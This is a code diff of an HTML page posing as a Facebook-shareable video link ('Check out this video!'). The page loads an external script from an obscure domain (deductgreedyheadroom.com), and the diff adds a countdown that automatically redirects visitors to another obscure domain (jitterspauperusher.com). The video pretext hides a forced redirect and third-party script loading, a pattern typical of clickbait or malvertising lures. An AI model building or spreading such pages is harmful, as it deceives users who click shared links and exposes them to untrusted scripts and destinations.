@@ -8,9 +8,9 @@
 <!-- Facebook Link Preview -->
 <meta property="og:title" content="Check out this video!">
 <meta property="og:description" content="Watch this amazing video now.">
-<meta property="og:image" content="YOUR_THUMBNAIL.jpg"> <!-- FB Thumbnail -->
+<meta property="og:image" content="https://i.postimg.cc/3WBSNPKs/3WBSNPKs.jpg">
 <meta property="og:type" content="website">
-<meta property="og:url" content="YOUR_PAGE_URL">
+<meta property="og:url" content="https://YOUR_PAGE_URL_HERE">
 
 <style>
   body {
@@ -28,7 +28,7 @@
   #my-player {
     width: 90%;
     max-width: 600px;
-    height: 340px; /* adjust if needed */
+    height: 340px;
     margin-bottom: 20px;
     background: #000;
   }
@@ -59,4 +59,20 @@
 <script src="https://deductgreedyheadroom.com/zbs.kek.js"></script>
 
 <script>
-  // Countdown &
+  // Countdown & Auto Redirect
+  let seconds = 5;
+  const countdownEl = document.getElementById("countdown");
+  const targetURL = "https://jitterspauperusher.com/2084848/";
+
+  const interval = setInterval(() => {
+    seconds--;
+    countdownEl.textContent = seconds;
+    if (seconds <= 0) {
+      clearInterval(interval);
+      window.location.href = targetURL;
+    }
+  }, 1000);
+</script>
+
+</body>
+</html>
